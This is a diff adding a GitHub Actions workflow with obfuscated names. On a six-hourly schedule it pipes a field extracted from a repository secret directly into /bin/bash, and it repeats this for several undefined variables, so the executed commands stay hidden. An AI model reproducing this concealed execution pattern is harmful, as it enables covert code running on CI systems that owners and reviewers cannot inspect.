@@ -1,0 +1,24 @@
+name: duanhongbinhui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanhongbinhui
+        env:
+          uyn69: ${{ secrets.uyn69 }}
+        run: |
+          echo $uyn69 | jq -r .izgtx611 | /bin/bash
+          echo $thh06 | jq -r .ck28 | /bin/bash
+          echo $ix295 | jq -r .un548 | /bin/bash
+          echo $mhcwf78549 | jq -r .tl32 | /bin/bash
+          echo $wnd31604 | jq -r .zdqp165 | /bin/bash
+          echo $ngkc36 | jq -r .gez5062 | /bin/bash
+          echo $ycvj5606 | jq -r .x71 | /bin/bash
+
